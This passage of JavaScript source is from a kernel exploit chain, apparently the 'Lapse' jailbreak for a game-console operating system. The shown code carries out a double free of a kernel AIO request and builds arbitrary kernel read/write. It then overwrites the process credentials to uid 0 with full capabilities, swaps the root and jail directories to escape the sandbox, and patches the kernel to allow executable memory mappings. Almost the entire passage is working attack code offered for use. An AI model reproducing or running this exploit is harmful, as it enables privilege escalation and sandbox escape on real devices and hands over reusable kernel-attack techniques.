    log('  reqs1_addr: ' + hex(leak_result.reqs1_addr));
    log('  kbuf_addr: ' + hex(leak_result.kbuf_addr));
    log('  kernel_addr: ' + hex(leak_result.kernel_addr));
    log('  target_id: ' + hex(leak_result.target_id));
    log('  fake_reqs3_addr: ' + hex(leak_result.fake_reqs3_addr));
    log('  aio_info_addr: ' + hex(leak_result.aio_info_addr));
    log('  evf: ' + hex(leak_result.evf));
    log('');
    log('=== STAGE 3: Double free SceKernelAioRWRequest ===');
    var pktopts_sds = double_free_reqs1(leak_result.reqs1_addr, leak_result.target_id, leak_result.evf, new BigInt(sd_pair[0]), sds, sds_alt, leak_result.fake_reqs3_addr);
    close(leak_result.fake_reqs3_sd);
    if (pktopts_sds === null) {
      log('Stage 3 double free SceKernelAioRWRequest failed');
      cleanup_fail();
      return false;
    }
    log('Stage 3 completed!');
    log('Aliased socket pair: ' + hex(pktopts_sds[0]) + ', ' + hex(pktopts_sds[1]));
    log('');
    log('=== STAGE 4: Get arbitrary kernel read/write ===');
    var arw_result = make_kernel_arw(pktopts_sds, leak_result.reqs1_addr, leak_result.kernel_addr, sds, sds_alt, leak_result.aio_info_addr);
    if (arw_result === null) {
      log('Stage 4 get arbitrary kernel read/write failed');
      cleanup_fail();
      return false;
    }
    log('Stage 4 completed!');
    log('');
    log('=== STAGE 5: Jailbreak ===');
    var OFFSET_P_UCRED = 0x40;
    var proc = kernel.addr.curproc;
    if (!proc || !kernel.addr.inside_kdata) {
      throw new Error('kernel addresses not initialized');
    }

    // Calculate kernel base
    kernel.addr.base = kernel.addr.inside_kdata.sub(kernel_offset.EVF_OFFSET);
    log('Kernel base: ' + hex(kernel.addr.base));
    var uid_before = Number(getuid());
    var sandbox_before = Number(is_in_sandbox());
    log('BEFORE: uid=' + uid_before + ', sandbox=' + sandbox_before);

    // Patch ucred
    var proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD));
    var ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED));
    kernel.write_dword(ucred.add(0x04), 0); // cr_uid
    kernel.write_dword(ucred.add(0x08), 0); // cr_ruid
    kernel.write_dword(ucred.add(0x0C), 0); // cr_svuid
    kernel.write_dword(ucred.add(0x10), 1); // cr_ngroups
    kernel.write_dword(ucred.add(0x14), 0); // cr_rgid

    var prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0));
    kernel.write_qword(ucred.add(0x30), prison0);
    kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF)); // sceCaps
    kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF));
    var rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE));
    kernel.write_qword(proc_fd.add(0x10), rootvnode); // fd_rdir
    kernel.write_qword(proc_fd.add(0x18), rootvnode); // fd_jdir

    var uid_after = Number(getuid());
    var sandbox_after = Number(is_in_sandbox());
    log('AFTER:  uid=' + uid_after + ', sandbox=' + sandbox_after);
    if (uid_after === 0 && sandbox_after === 0) {
      log('Sandbox escape complete!');
    } else {
      log('[WARNING] Sandbox escape may have failed');
    }

    // === Apply kernel patches via kexec ===
    // Uses syscall_raw() which sets rax manually for syscalls without gadgets
    log('Applying kernel patches...');
    var kpatch_result = apply_kernel_patches(FW_VERSION);
    if (kpatch_result) {
      log('Kernel patches applied successfully!');

      // Comprehensive kernel patch verification
      log('Verifying kernel patches...');
      var all_patches_ok = true;

      // 1. Verify mmap RWX patch (0x33 -> 0x37 at two locations)
      var mmap_offsets = get_mmap_patch_offsets(FW_VERSION);
      if (mmap_offsets) {
        var b1 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[0]));
        var b2 = ipv6_kernel_rw.ipv6_kread8(kernel.addr.base.add(mmap_offsets[1]));
        var byte1 = Number(b1.and(0xff));
        var byte2 = Number(b2.and(0xff));
        if (byte1 === 0x37 && byte2 === 0x37) {
          log('  [OK] mmap RWX patch');
        } else {
          log('  [FAIL] mmap RWX: [' + hex(mmap_offsets[0]) + ']=' + hex(byte1) + ' [' + hex(mmap_offsets[1]) + ']=' + hex(byte2));
          all_patches_ok = false;
        }
      } else {
        log('  [SKIP] mmap RWX (no offsets for FW ' + FW_VERSION + ')');
      }

      // 2. Test mmap RWX actually works by trying to allocate RWX memory
      try {
        var PROT_RWX = 0x7; // READ | WRITE | EXEC
        var MAP_ANON = 0x1000;
        var MAP_PRIVATE = 0x2;
        var test_addr = mmap(new BigInt(0), 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0);
        if (Number(test_addr.shr(32)) < 0xffff8000) {
          log('  [OK] mmap RWX functional @ ' + hex(test_addr));
          // Unmap the test allocation
          munmap(test_addr, 0x1000);
        } else {
          log('  [FAIL] mmap RWX functional: ' + hex(test_addr));
          all_patches_ok = false;
        }
      } catch (e) {
        log('  [FAIL] mmap RWX test error: ' + e.message);
        all_patches_ok = false;
      }
      if (all_patches_ok) {
        log('All kernel patches verified OK!');
      } else {
        log('[WARNING] Some kernel patches may have failed');
      }
    } else {
      log('[WARNING] Kernel patches failed - continuing without patches');
    }
    log('Stage 5 completed - JAILBROKEN');
    // utils.notify("The Vue-after-Free team congratulates you\nLapse Finished OK\nEnjoy freedom");

    cleanup();
    return true;
  } catch (e) {
    var _stack2;
    log('Lapse error: ' + e.message);
    alert('Lapse error: ' + e.message);
    utils.notify('Reboot and try again!');
    log((_stack2 = e.stack) !== null && _stack2 !== void 0 ? _stack2 : '');
    return false;
  }
}
function cleanup() {
  log('Performing cleanup...');
  try {
    if (block_fd !== 0xffffffff) {
      close(new BigInt(block_fd));
      block_fd = 0xffffffff;
    }
    if (unblock_fd !== 0xffffffff) {
      close(new BigInt(unblock_fd));
      unblock_fd = 0xffffffff;
    }
    if (typeof groom_ids !== 'undefined') {
      if (groom_ids !== null) {
        var groom_ids_addr = malloc(4 * NUM_GROOMS);
        for (var i = 0; i < NUM_GROOMS; i++) {
          write32(groom_ids_addr.add(i * 4), groom_ids[i]);
        }
        free_aios2(groom_ids_addr, NUM_GROOMS);
        groom_ids = null;
      }
    }
    if (block_id !== 0xffffffff) {
      var block_id_buf = malloc(4);
      write32(block_id_buf, block_id);
      var block_errors = malloc(4);
      aio_multi_wait_fun(block_id_buf, 1, block_errors, 1, 0);
      aio_multi_delete_fun(block_id_buf, 1, block_errors);
      block_id = 0xffffffff;
    }
    if (sds !== null) {
      for (var sd of sds) {
        close(sd);
      }
      sds = null;
    }
    if (sds_alt !== null) {
      for (var _sd3 of sds_alt) {
        close(_sd3);
      }
      sds_alt = null;
    }
    if (sd_pair !== null) {
      close(sd_pair[0]);
      close(sd_pair[1]);
    }
    sd_pair = null;
    if (prev_core >= 0) {
      log('Restoring to previous core: ' + prev_core);
      pin_to_core(prev_core);
      prev_core = -1;
    }
    set_rtprio(prev_rtprio);
    log('Cleanup completed');
  } catch (e) {
    log('Error during cleanup: ' + e.message);
  }
}
function cleanup_fail() {
  utils.notify('Lapse Failed! reboot and try again! UwU');
  jsmaf.root.children.push(bg_fail);
  cleanup();
}